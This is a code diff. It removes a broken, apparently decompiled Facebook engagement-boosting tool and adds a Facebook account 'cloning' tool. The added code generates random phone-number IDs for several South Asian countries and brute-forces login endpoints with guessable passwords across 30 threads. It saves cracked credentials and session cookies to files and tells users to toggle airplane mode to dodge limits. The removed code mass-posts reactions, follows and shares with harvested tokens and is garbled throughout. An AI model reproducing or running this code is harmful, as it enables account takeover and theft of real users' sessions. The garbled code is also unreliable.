+                token = po['access_token']
+                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
+                print(f'\r\r\x1b[38;5;46m|A x N_OK| '+ids+' | '+pas)
+                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
+                open('/sdcard/ASIF-M7-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                oks.append(ids)
+                break
+            elif 'www.facebook.com' in po['error']['message']:
+                print(f'\r\r{R}|A x N_CP| '+ids+f' | '+pas)
+                open('/sdcard/ASIF-M7-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
+                break
+        loop+=1
+    except requests.exceptions.ConnectionError:
+        time.sleep(20)
+    except Exception as e:
+        pass
+#──────────────{ FILE-METHOD-M8 }──────────────#
+def __file_M8__(ids,names,passlist):
+	global loop,oks,cps
+	sys.stdout.write(f'\r\r{A}|ASIF-M8| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+	session = requests.Session()
+	try:
+		first = names.split(' ')[0]
+		try:
+			last = names.split(' ')[1]
+		except:
+			last = 'Ahmed'
+		ps = first.lower()
+		ps2 = last.lower()
+		for fikr in passlist:
+			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
+			ua=random.choice(ugen)
+			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+			Asifxd=session.cookies.get_dict().keys()
+			if "c_user" in Asifxd:
+				coki=session.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+				print(f'\r\r\x1b[38;5;46m|A x N_OK| '+ids+' | '+pas)
+				print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
+				open('/sdcard/ASIF-M7-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+				oks.append(ids)
+				break
+			elif 'checkpoint' in Asifxd:
+				print(f'\r\r{R}|A x N_CP| '+ids+' | '+pas)
+				open('/sdcard/ASIF-M8-CP.txt','a').write(ids+'|'+pas+'\n')
+				cps.append(ids)
+				break
+			else:
+				continue
+	except requests.exceptions.ConnectionError:
+		time.sleep(20)
+	loop+=1
+#──────────────{ RANDOM }──────────────#
+def __Randmx__():
+	clear()
+	print(f"{A}|1| BANGLADESH CLONING");print(f"{A}|2| INDIA CLONING");print(f"{A}|3| NEPAL CLONING");print(f"{A}|4| PAKISTAN CLONING");print(f"{A}|5| AFGHANISTAN CLONING");linex();option = input(f'{A}|?| CHOICE : ')
+	if option in ['A','1']:__bdx__()
+	elif option in ['B','2']:__india__()
+	elif option in ['C','3']:__nepalx__()
+	elif option in ['D','4']:__pakistan__()
+	elif option in ['E','5']:__afghanistanx__()
+	else:
+		print(f'\n{A}|=| OPTION FOUND');menu()
+#──────────────{ RANDOM-BD }──────────────#
+def __bdx__():
+    user=[]
     clear()
-    logo()
-    print(f'''{yellow}  Target    : {green}{uid}''')
-    print(f'''{yellow}  Limit     : {green}{limite}''')
-    line()
-    executor = ThreadPoolExecutor(max_workers = 30)
-    for i in range(min(len(coki_file), limite)):
-        coki = coki_file[i]
-        executor.submit(sending, coki, post_link, r_id)
-        print(None, None)
-        return None
-        if not None:
-            pass
-
-
-def sending(coki, post_link, r_id):
-    headers_fb_lite['cookie'] = coki
-    getdata = html_req(post_link, Headers = headers_fb_lite, Cookie = {
-        'cookie': coki })
-    all_links = getdata.find_all('a')
-    for link in all_links:
-        url = 'https://mbasic.facebook.com' + link['href']
-        if r_id in url:
-            headers_fb_lite['cookie'] = coki
-            response = requests.get(url, headers = headers_fb_lite, cookies = {
-                'cookie': coki })
-            pageid = str(coki).split('c_user=')[1].split(';')[0]
-            if pageid in response.text:
-                print(f'''{yellow}  Sucessfully React! {white}---> {green}{pageid}''')
-        return None
-        if Exception:
-            e = None
-            print(f'''{red}  An error occurred: {e}''')
-            e = None
-            del e
-            return None
-        e = None
-        del e
-
-
-def react_comment():
-    ses = requests.Session()
-    
-    def get_access_token_from_file(file_path):
-        file = open(file_path, 'r')
-        print(None, None)
-        return file.read().strip().split('\n')
-        if not None:
-            pass
-        return None
-        if FileNotFoundError:
-            print(f'''{red}  Start the tool first!''')
-            return None
-
+    print(f'{A}|=| EXAMPLE : 017 / 019 / 016 / 018');linex();code=input(f'{A}|?| CHOICE  : ')
     clear()
-    logo()
-    print(f'''{white}  CHOOSE FACEBOOK TO REACT:''')
-    print(f'''{yellow}  [1] {blue}YOUR FRA LIST''')
-    print(f'''{yellow}  [2] {blue}YOUR RPA LIST''')
-    print(f'''{yellow}  [3] {blue}YOUR FRA PAGES LIST''')
-    print(f'''{yellow}  [4] {blue}YOUR RPA PAGES LIST''')
-    print(f'''{red}  [0] {red}RETURN TO MAIN MENU''')
-    line()
-    account_choose = input(f'''{yellow}  Choose : {green}''')
-    line()
-    if account_choose == '1' or account_choose == '01':
-        file_path = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT.txt'
-    if account_choose == '2' or account_choose == '02':
-        file_path = '/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT.txt'
-    if account_choose == '3' or account_choose == '03':
-        file_path = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt'
-    if account_choose == '4' or account_choose == '04':
-        file_path = '/sdcard/.EXTRACT-TOKEN-RP-PAGES.txt'
-    if account_choose == '0' or account_choose == '00':
-        main()
-    print(f'''{red}  Invalid Input!''')
-    sleep(1.5)
-    react_comment()
-    access_tokens = get_access_token_from_file(file_path)
-    if not access_tokens:
-        return None
-    comment_uid = print(f'''{yellow}  Enter Comment UID: {green}''')
-    line()
-    print(f'''{white}  CHOOSE REACTION: ''')
-    print(f'''{yellow}  [1] {blue}LIKE''')
-    print(f'''{yellow}  [2] {blue}LOVE''')
-    print(f'''{yellow}  [3] {blue}HAHA''')
-    print(f'''{yellow}  [4] {blue}WOW''')
-    print(f'''{yellow}  [5] {blue}ANGRY''')
-    print(f'''{yellow}  [6] {blue}SAD''')
-    line()
-    react_choice = input(f'''{yellow}  Choose : {green}''')
-    reaction_types = {
-        '1': 'LIKE',
-        '2': 'LOVE',
-        '3': 'HAHA',
-        '4': 'WOW',
-        '5': 'ANGRY',
-        '6': 'SAD' }
-    reaction_type = reaction_types.get(react_choice)
-    if not reaction_type:
-        print(f'''{red}  Invalid reaction choice.''')
-        return None
-    line()
-    limit = int(input(f'''{yellow}  Input quantity of reactions, limit is {green}{len(access_tokens)} : '''))
-    if ValueError:
-        print(f'''{red}  Error: Please enter a valid number for the limit.''')
-        return None
-    if limit > len(access_tokens):
-        print(f'''{red}  Error: The specified limit exceeds the number of available reactors.''')
-        return None
-    success_count = None
-    failure_count = 0
-    for i, access_token in enumerate(access_tokens[:limit]):
-        uid_url = f'''{comment_uid}'''
-        auto_react = f'''https://graph.facebook.com/v18.0/{uid_url}/reactions?type={reaction_type}&access_token={access_token}'''
-        time.sleep(1)
-        headers_ = {
-            'user-agent': W_ueragnt() }
-        response = requests.post(auto_react, headers = headers_)
-        if response.ok:
-            line()
-            print(f'''{green}  REACTOR {i + 1} ---> Successfully React!''')
-            success_count += 1
-        line()
-        print(f'''{red}  REACTOR {i + 1} ---> {red}Failed to React!''')
-        failure_count += 1
-        line()
-        print(f'''{yellow}  TOTAL : \n''')
-        print(f'''{green}  Completed : {white}{success_count}''')
-        print(f'''{red}  Failed : {white}{failure_count}''')
-        return None
-
-
-def react_reels():
-    ses = requests.Session()
-    
-    def get_access_token_from_file(file_path):
-        file = open(file_path, 'r')
-        print(None, None)
-        return file.read().strip().split('\n')
-        if not None:
-            pass
-        return None
-        if FileNotFoundError:
-            print(f'''{red}  Start the tool first!''')
-            return None
-
+    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
+    try:
+        limit=int(input(f'{A}|?| CHOICE  : '))
+    except ValueError:
+        limit=50000
     clear()
-    logo()
-    print(f'''{white}  CHOOSE FACEBOOK TO REACT:''')
-    print(f'''{yellow}  [1] {blue}YOUR FRA LIST''')
-    print(f'''{yellow}  [2] {blue}YOUR RPA LIST''')
-    print(f'''{yellow}  [3] {blue}YOUR FRA PAGES LIST''')
-    print(f'''{yellow}  [4] {blue}YOUR RPA PAGES LIST''')
-    print(f'''{red}  [0] {red}RETURN TO MAIN MENU''')
-    line()
-    account_choose = input(f'''{yellow}  Choose : {green}''')
-    line()
-    if account_choose == '1' or account_choose == '01':
-        file_path = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT.txt'
-    if account_choose == '2' or account_choose == '02':
-        file_path = '/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT.txt'
-    if account_choose == '3' or account_choose == '03':
-        file_path = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt'
-    if account_choose == '4' or account_choose == '04':
-        file_path = '/sdcard/.EXTRACT-TOKEN-RP-PAGES.txt'
-    if account_choose == '0' or account_choose == '00':
-        main()
-    print(f'''{red}  Invalid Input!''')
-    sleep(1.5)
-    react_comment()
-    access_tokens = get_access_token_from_file(file_path)
-    if not access_tokens:
-        return None
-    comment_uid = print(f'''{yellow}  Enter Reels Video UID: {green}''')
-    line()
-    print(f'''{white}  CHOOSE REACTION: ''')
-    print(f'''{yellow}  [1] {blue}LIKE''')
-    print(f'''{yellow}  [2] {blue}LOVE''')
-    print(f'''{yellow}  [3] {blue}HAHA''')
-    print(f'''{yellow}  [4] {blue}WOW''')
-    print(f'''{yellow}  [5] {blue}ANGRY''')
-    print(f'''{yellow}  [6] {blue}SAD''')
-    line()
-    react_choice = input(f'''{yellow}  Choose : {green}''')
-    reaction_types = {
-        '1': 'LIKE',
-        '2': 'LOVE',
-        '3': 'HAHA',
-        '4': 'WOW',
-        '5': 'ANGRY',
-        '6': 'SAD' }
-    reaction_type = reaction_types.get(react_choice)
-    if not reaction_type:
-        print(f'''{red}  Invalid reaction choice.''')
-        return None
-    line()
-    limit = int(input(f'''{yellow}  Input quantity of reactions, limit is {green}{len(access_tokens)} : '''))
-    if ValueError:
-        print(f'''{red}  Error: Please enter a valid number for the limit.''')
-        return None
-    if limit > len(access_tokens):
-        print(f'''{red}  Error: The specified limit exceeds the number of available reactors.''')
-        return None
-    success_count = None
-    failure_count = 0
-    for i, access_token in enumerate(access_tokens[:limit]):
-        uid_url = f'''{comment_uid}'''
-        auto_react = f'''https://graph.facebook.com/v18.0/{uid_url}/reactions?type={reaction_type}&access_token={access_token}'''
-        time.sleep(1)
-        headers_ = {
-            'user-agent': W_ueragnt() }
-        response = requests.post(auto_react, headers = headers_)
-        if response.ok:
-            line()
-            print(f'''{green}  REACTOR {i + 1} ---> Successfully React!''')
-            success_count += 1
-        line()
-        print(f'''{red}  REACTOR {i + 1} ---> {red}Failed to React!''')
-        failure_count += 1
-        line()
-        print(f'''{yellow}  TOTAL : \n''')
-        print(f'''{green}  Completed : {white}{success_count}''')
-        print(f'''{red}  Failed : {white}{failure_count}''')
-        return None
-
-
-def follow():
+    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
+    for nmbr in range(limit):
+        nmp=''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as Asifx:
+        clear()
+        tl=str(len(user))
+        print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
+        for love in user:
+            ids=code+love
+            passlist=[love,ids,ids[:7],ids[:6],ids[5:],ids[4:],'bangladesh','506070','405060','102030','freefire','i love you','mahedi','708090','@@@###','@#@#@#']
+            if methodx in ['1']:Asifx.submit(__Randm_M1__,ids,passlist)
+            if methodx in ['2']:Asifx.submit(__Randm_M2__,ids,passlist)
+            if methodx in ['3']:Asifx.submit(__Randm_M3__,ids,passlist)
+            if methodx in ['4']:Asifx.submit(__Randm_M4__,ids,passlist)
+            if methodx in ['5']:Asifx.submit(__Randm_M5__,ids,passlist)
+    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
+#──────────────{ RANDOM-INDIA }──────────────#
+def __india__():
+    user=[]
     clear()
-    logo()
-    print(f'''{white}  CHOOSE FACEBOOK TO FOLLOW:''')
-    print(f'''{yellow}  [1] {blue}YOUR FRA LIST''')
-    print(f'''{yellow}  [2] {blue}YOUR RPA LIST''')
-    print(f'''{yellow}  [3] {blue}YOUR FRA PAGES LIST''')
-    print(f'''{yellow}  [4] {blue}YOUR RPA PAGES LIST''')
-    print(f'''{red}  [0] {red}RETURN TO MAIN MENU''')
-    line()
-    account_choose = input(f'''{yellow}  Choose : {green}''')
-    line()
-    if account_choose == '1' or account_choose == '01':
-        file_path = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT.txt'
-    if account_choose == '2' or account_choose == '02':
-        file_path = '/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT.txt'
-    if account_choose == '3' or account_choose == '03':
-        file_path = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt'
-    if account_choose == '4' or account_choose == '04':
-        file_path = '/sdcard/.EXTRACT-TOKEN-RP-PAGES.txt'
-    if account_choose == '0' or account_choose == '00':
-        main()
-    print(f'''{red}  Invalid Input!''')
-    sleep(1.5)
-    follow()
-    access_tokens = get_access_token_from_file(file_path)
-    if not access_tokens:
-        return None
-    user_id = print(f'''{yellow}  Enter target UID : {green}''')
-    line()
-    limit = int(input(f'''{yellow}  Input quantity of follows, limit is {green}{len(access_tokens)} : '''))
-    if ValueError:
-        print(f'''{red}  Error: Please enter a valid number for the limit.''')
-        return None
-    if limit > len(access_tokens):
-        print(f'''{red}  Error: The specified limit exceeds the number of available followers.''')
-        return None
-    success_count = None
-    failure_count = 0
-    for i, access_token in enumerate(access_tokens[:limit]):
-        auto_follow_url = f'''https://graph.facebook.com/v19.0/{user_id}/subscribers'''
-        time.sleep(1)
-        headers = {
-            'Authorization': f'''Bearer {access_token}''',
-            'user-agent': W_ueragnt() }
-        response = requests.post(auto_follow_url, headers = headers)
-        if response.ok:
-            line()
-            print(f'''{green}  FOLLOWER {i + 1} ---> Successfully Follow!''')
-            success_count += 1
-        line()
-        print(f'''{red}  FOLLOWER {i + 1} ---> Failed to Follow!''')
-        failure_count += 1
-        line()
-        print(f'''{yellow}  TOTAL : \n''')
-        print(f'''{green}  Completed : {white}{success_count}''')
-        print(f'''{red}  Failed : {white}{failure_count}''')
-        return None
-
-
-def auto_comment():
-    
-    def convert_to_traodoisub(url):
-        response = requests.post('https://id.traodoisub.com/api.php', data = {
-            'link': url })
-        if response.status_code == 200:
-            result = response.json().get('id')
-            return result
-        return None
-        if Exception:
-            e = None
-            print(f'''{red}  An error occurred: {e}''')
-            e = None
-            del e
-            return None
-        e = None
-        del e
-
-    
-    def extract_uid_from_link(post_link):
-        pattern = 'https://www\\.facebook\\.com/(\\d+)/posts/[^/]+/?'
-        match = re.match(pattern, post_link)
-        if match:
-            return match.group(1)
-        print(f'''{red}  Invalid post link.''')
-
-    
-
-
-def auto_comment_to_dp():
-    
-    def convert_to_traodoisub(url):
-        response = requests.post('https://id.traodoisub.com/api.php', data = {
-            'link': url })
-        if response.status_code == 200:
-            result = response.json().get('id')
-            return result
-        return None
-        if Exception:
-            e = None
-            print(f'''{red}  An error occurred: {e}''')
-            e = None
-            del e
-            return None
-        e = None
-        del e
-
-    
-    def extract_uid_from_link(post_link):
-        pattern = 'https://www\\.facebook\\.com/(\\d+)/posts/[^/]+/?'
-        match = re.match(pattern, post_link)
-        if match:
-            return match.group(1)
-        print(f'''{red}  Invalid post link.''')
-
-    
-
-
-
-def reply_to_comment():
-    
-    def convert_to_traodoisub(url):
-        response = requests.post('https://id.traodoisub.com/api.php', data = {
-            'link': url })
-        if response.status_code == 200:
-            result = response.json().get('id')
-            return result
-        return None
-        if Exception:
-            e = None
-            print(f'''{red}  An error occurred: {e}''')
-            e = None
-            del e
-            return None
-        e = None
-        del e
-
-    
-    def extract_uid_from_link(post_link):
-        pattern = 'https://www\\.facebook\\.com/(\\d+)/posts/[^/]+/?'
-        match = re.match(pattern, post_link)
-        if match:
-            return match.group(1)
-        print(f'''{red}  Invalid post link.''')
-
-    
-def auto_share():
+    print(f'{A}|=| EXAMPLE : +91639 / +98282 / +92627 ');linex();code=input(f'{A}|?| CHOICE  : ')
     clear()
-    logo()
-    print(f'''{red}  Note : {green}Use{blue} Facebook Lite {green}in copying post link.''')
-    line()
-    ids = input(f'''{yellow}  Enter your account UID use for auto share : {green}''')
-    line()
-    pas = input(f'''{yellow}  Enter Password : {green}''')
-    ses = requests.Session()
-    fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
-    fbbv = str(random.randint(111111111, 999999999))
-    fbrv = '0'
-    random_seed = random.Random()
-    adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
-    ua_bgraph = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';' + '[FBAN/FB4A;FBAV/' + fbav + ';FBBV/' + fbbv + ';FBDM/{density=3.0,width=1080,height=2107};FBLC/fr_FR;FBRV/' + fbrv + ';FBCR/Ooredoo TN;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1M;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
-    data = {
-        'locale': 'en_SV',
-        'client_country_code': 'SV',
-        'fb_api_req_friendly_name': 'authenticate',
-        'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
-        'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
-    head = {
-        'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32' }
-    url = 'https://graph.facebook.com/auth/login'
-    po = requests.post(url, data = data, headers = head).json()
-    if 'session_key' in po:
-        poo = requests.post(url, data = data, headers = head).json().get('access_token', '')
-        token = str(poo)
-        cookie = po.get('session_cookies', [])()
-    
-
-
-
-    
-    def convert_to_traodoisub(url):
-        response = requests.post('https://id.traodoisub.com/api.php', data = {
-            'link': url })
-        if response.status_code == 200:
-            result = response.json().get('id')
-            return result
-        return None
-        if Exception:
-            e = None
-            print(f'''An error occurred: {e}''')
-            e = None
-            del e
-            return None
-        e = None
-        del e
-
-    
-    def extract_uid_from_link(post_link):
-        pattern = 'https://www\\.facebook\\.com/(\\d+)/posts/[^/]+/?'
-        match = re.match(pattern, post_link)
-        if match:
-            return match.group(1)
-        print('Invalid post link.')
-
-    
-    def auto_share_post(post_link = 'X-FB-Request-Analytics-Tags', token = 'graphservice', cookie = 'X-FB-HTTP-Engine'):
-        headers = {
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
-            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': 'Windows',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'authority': 'graph.facebook.com' }
-        n = 0
-        for x in range(limit):
-            n += 1
-            post = ses.post(f'''https://graph.facebook.com/v13.0/me/feed?link={post_link}&published=0&access_token={token}''', headers = headers, cookies = cookie).text
-            time.sleep(0.1)
-            data = json.loads(post)
-            if 'id' in post:
-                print(f'''\r{yellow}  Share done - {green}{n}''', end = '')
-                sys.stdout.flush()
-            print('\n')
-            print(f'''{red}  Auto Share Stop!''')
-            exit()
-            return None
-            if requests.exceptions.ConnectionError:
-                print(f'''\n{red}  You are not connected to the internet!''')
-                exit()
-                return None
-
-    line()
-    post_link = input(f'''{yellow}  Enter post link: {green}''')
-    pages_datas = extract_fb_pages(poo)
-    if not pages_datas:
-        print(f'''{red}  Error fetching Facebook.''')
-        return None
-    converted_link = convert_to_traodoisub(post_link)
-    line()
-    limit = int(input(f'''{yellow}  Enter limit of shares : {green}'''))
-    line()
-    if ValueError:
-        'ViewerReactionsMutation'
-        print(f'''{red}  Error: Please enter a valid number for the limit.''')
-        return None
-    n = 0
-    for page in pages_datas:
-        auto_share_post(post_link, token, cookie)
-        n += 1
-        if n == limit:
-            'ViewerReactionsMutation'
-        print()
-        print(f'''{green}  Sharing Completed!''')
-        return None
-
-headers_global = {
-    'user-agent': W_ueragnt(),
-    'viewport-width': '576' }
-ser = requests.get('https://raw.githubusercontent.com/Shuvo-BBHH/cnt/main/MY_SELL_PROJECT/smm.txt').text
-speed = 100
-allcookie = []
-s_react = []
-s_comment = []
-s_flw = []
-logos = logo
-
-def enc(txt):
-    encoded_bytes = base64.b64encode(txt.encode('utf-8'))
-    encoded_string = encoded_bytes.decode('utf-8')
-    return encoded_string
-
-
-def start_tool():
+    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
+    try:
+        limit=int(input(f'{A}|?| CHOICE  : '))
+    except ValueError:
+        limit=50000
     clear()
-    logo()
-    print(f'''{yellow}  [1] {cyan}EXTRACT NORMAL ACCOUNT PAGES     {yellow}-  {green}[UID and Password]''')
-    print(f'''{yellow}  [2] {cyan}EXTRACT SINGLE NORMAL ACCOUNT    {yellow}-  {green}[No Duplicate Checker]''')
-    print(f'''{yellow}  [3] {cyan}EXTRACT BULK NORMAL ACCOUNTS M1  {yellow}-  {green}[Thru TXT File]''')
-    print(f'''{yellow}  [4] {cyan}EXTRACT BULK NORMAL ACCOUNTS M2  {yellow}-  {green}[Thru TXT File]''')
-    print(f'''{yellow}  [5] {cyan}EXTRACT BULK ACCOUNTS PAGES      {yellow}-  {green}[Thru TXT File]''')
-    print(f'''{yellow}  [0] {red}RETURN TO MAIN MENU''')
-    line()
-    choice = input(f'''{yellow}  Choose : {green}''')
-    if choice == '1':
-        get_facebook_pages()
-        return None
-    if None == '2':
-        get_facebook_account()
-        return None
-    if None == '3':
-        bgraph_bulk_account()
-        return None
-    if None == '4':
-        datr()
-        return None
-    if None == '5':
-        bgraph_bulk_pages()
-        return None
-    if None == '0':
-        main()
-        return None
-    print(f'''{red}  Invalid choice. Please pick a number from 1 to 6.''')
-
-
-def count_lines_in_files(*file_paths):
-    for i, file_path in enumerate(file_paths, start = 1):
-        file = open(file_path, 'r')
-        total_lines = file()
-        if i == 1:
-            print(f'''\t\t{blue}     FRA ACCOUNT {yellow}: {green}{total_lines}''')
-        if i == 2:
-            print(f'''\t\t{blue}     RPA ACCOUNT {yellow}: {green}{total_lines}''')
-        if i == 3:
-            print(f'''\t\t{blue}     FRA PAGES   {yellow}: {green}{total_lines}''')
-        if i == 4:
-            print(f'''\t\t{blue}     RPA PAGES   {yellow}: {green}{total_lines}''')
-        print(None, None)
-        if not sum:
-            pass
-        if FileNotFoundError:
-            print(f'''\t\t{red}   Not Found!''')
-        return None
-
-path_file1 = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT.txt'
-path_file2 = '/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT.txt'
-path_file3 = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt'
-path_file4 = '/sdcard/.EXTRACT-TOKEN-RP-PAGES.txt'
-
-def main():
+    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as Asifx:
+        clear()
+        tl=str(len(user))
+        print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
+        for love in user:
+            ids=code+love
+            passlist=[love,ids,ids[:7],ids[:6],love[1:],"57273200","5757575"]
+            if methodx in ['1']:Asifx.submit(__Randm_M1__,ids,passlist)
+            if methodx in ['2']:Asifx.submit(__Randm_M2__,ids,passlist)
+            if methodx in ['3']:Asifx.submit(__Randm_M3__,ids,passlist)
+            if methodx in ['4']:Asifx.submit(__Randm_M4__,ids,passlist)
+            if methodx in ['5']:Asifx.submit(__Randm_M5__,ids,passlist)
+    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
+#──────────────{ RANDOM-NEPAL }──────────────#
+def __nepalx__():
+    user=[]
     clear()
-    logo()
-    open('/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT.txt', 'a').write('')
-    open('/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNT-NAME-ID.txt', 'a').write('')
-    open('/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT.txt', 'a').write('')
-    open('/sdcard/.EXTRACT-TOKEN-RP-ACCOUNT-NAME-ID.txt', 'a').write('')
-    open('/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt', 'a').write('')
-    open('/sdcard/.EXTRACT-TOKEN-FRA-PAGES-NAME-ID.txt', 'a').write('')
-    open('/sdcard/.EXTRACT-TOKEN-RP-PAGES.txt', 'a').write('')
-    open('/sdcard/.EXTRACT-TOKEN-RP-PAGES-NAME-ID.txt', 'a').write('')
-    print(f'''\t\t{cyan}YOUR BOOSTING TOOL OVERVIEW''')
-    count_lines_in_files(path_file1, path_file2, path_file3, path_file4)
-    line()
-    print(f'''{yellow}  [01] {cyan}START TOOL               {yellow}-  {green}[Page & Normal Account]''')
-    print(f'''{yellow}  [02] {blue}AUTO REACT W/O CARE      {yellow}-  {green}[Page & Normal Account]''')
-    print(f'''{yellow}  [03] {blue}AUTO REACT WITH CARE     {yellow}-  {green}[Normal Account Only]''')
-    print(f'''{yellow}  [04] {blue}AUTO REACT TO COMMENT    {yellow}-  {green}[Page & Normal Account]''')
-    print(f'''{yellow}  [05] {blue}AUTO REACT TO DP & COVER {yellow}-  {green}[Page & Normal Account]''')
-    print(f'''{yellow}  [06] {blue}AUTO REACT TO REELS      {yellow}-  {green}[Page & Normal Account]''')
-    print(f'''{yellow}  [07] {blue}AUTO FOLLOW              {yellow}-  {green}[Page & Normal Account]''')
-    print(f'''{yellow}  [08] {blue}AUTO COMMENT TO POST     {yellow}-  {green}[Page & Normal Account]''')
-    print(f'''{yellow}  [09] {blue}AUTO COMMENT TO REELS    {yellow}-  {green}[Page & Normal Account]''')
-    print(f'''{yellow}  [10] {blue}AUTO COMMENT TO DP       {yellow}-  {green}[Page & Normal Account]''')
-    print(f'''{yellow}  [11] {blue}REPLY TO COMMENT         {yellow}-  {green}[Page & Normal Account]''')
-    print(f'''{yellow}  [12] {blue}AUTO SHARE               {yellow}-  {green}[Normal Account Only]''')
-    print(f'''{yellow}  [13] {blue}AUTO GROUP JOIN          {yellow}-  {green}[Facebook Page Only]''')
-    print(f'''{yellow}  [14] {blue}LIKE & FOLLOW PAGE       {yellow}-  {green}[Facebook Page Only]''')
-    print(f'''{yellow}  [15] {blue}STORED PAGES AND ACCOUNT {yellow}-  {green}[Page & Normal Account]''')
-    print(f'''{yellow}  [16] {cyan}RESET TOOL''')
-    print(f'''{red}  [00] {red}EXIT''')
-    line()
-    choice = input(f'''{yellow}  Choose : {green}''').upper()
-    if choice == '1' or choice == '01':
-        start_tool()
-        return None
-    if None == '2' or choice == '02':
-        react()
-        return None
-    if None == '3' or choice == '03':
-        react_with_care()
-        return None
-    if None == '4' or choice == '04':
-        react_comment()
-        return None
-    if None == '5' or choice == '05':
-        react_dp_cover()
